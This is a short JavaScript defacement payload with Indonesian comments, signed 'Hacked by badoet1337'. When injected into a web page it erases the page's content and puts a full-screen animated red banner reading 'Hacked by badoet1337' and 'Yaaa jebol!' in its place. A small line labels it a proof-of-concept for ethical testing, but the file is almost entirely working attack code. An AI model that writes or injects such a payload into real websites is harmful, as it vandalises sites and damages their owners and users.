/* DEFACE SCRIPT PENTEST - Hacked by badoet1337 */

(function() {
    // === Bagian 1: Pembersihan Awal dan Styling ===
    
    // Hapus semua konten body yang ada dan setel body/html untuk tampilan penuh layar.
    document.documentElement.style.height = '100%';
    document.body.innerHTML = ''; 
    document.body.style.margin = '0';
    document.body.style.padding = '0';

    // === Bagian 2: Injeksi Font dan Styling Global ===
    
    // Muat font eksternal (Roboto Mono dari Google Fonts).
    var link = document.createElement('link');
    link.href = 'https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@700&display=swap';
    link.rel = 'stylesheet';
    document.head.appendChild(link);

    // Tambahkan styling global (termasuk keyframes untuk animasi) ke head.
    var style = document.createElement('style');
    style.innerHTML = `
        @keyframes pulse {
            0% { background: linear-gradient(135deg, #1e0000 0%, #3a0000 50%, #1e0000 100%); }
            50% { background: linear-gradient(135deg, #3a0000 0%, #5c0000 50%, #3a0000 100%); }
            100% { background: linear-gradient(135deg, #1e0000 0%, #3a0000 50%, #1e0000 100%); }
        }
        .glitch {
            animation: color-glitch 0.5s infinite alternate;
        }
        @keyframes color-glitch {
            0% { text-shadow: 2px 2px #00ffff, -2px -2px #ff00ff; }
            100% { text-shadow: 2px -2px #00ffff, -2px 2px #ff00ff; }
        }
        
        #defacement-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #1e0000 0%, #3a0000 50%, #1e0000 100%);
            animation: pulse 4s ease-in-out infinite;
            font-family: 'Roboto Mono', monospace;
            color: #ff0000;
            z-index: 999999;
            box-shadow: inset 0 0 50px rgba(255, 0, 0, 0.5);
            text-align: center;
        }
    `;
    document.head.appendChild(style);


    // === Bagian 3: Konten Deface ===
    
    // Buat elemen utama untuk menampung konten deface.
    var container = document.createElement('div');
    container.id = 'defacement-container';
    
    // Tambahkan pesan utama
    container.innerHTML = `
        <h1 class="glitch" style="
            font-size: 6vw;
            text-transform: uppercase;
            letter-spacing: 5px;
            padding: 10px 20px;
            border: 5px solid #ff0000;
            box-shadow: 0 0 20px #ff0000, inset 0 0 20px #ff0000;
            margin-bottom: 20px;
        ">
            Hacked by badoet1337
        </h1>
        
        <p style="
            font-size: 2.5vw;
            color: #ffffff;
            text-shadow: 0 0 10px #ffffff;
        ">
            Yaaa jebol!
        </p>
        
        <p style="
            font-size: 1vw;
            color: #cccccc;
            margin-top: 30px;
        ">
            [Vulnerability Proof-of-Concept for Ethical Testing]
        </p>
    `;

    // Tampilkan container di document body.
    document.body.appendChild(container);
    
})();
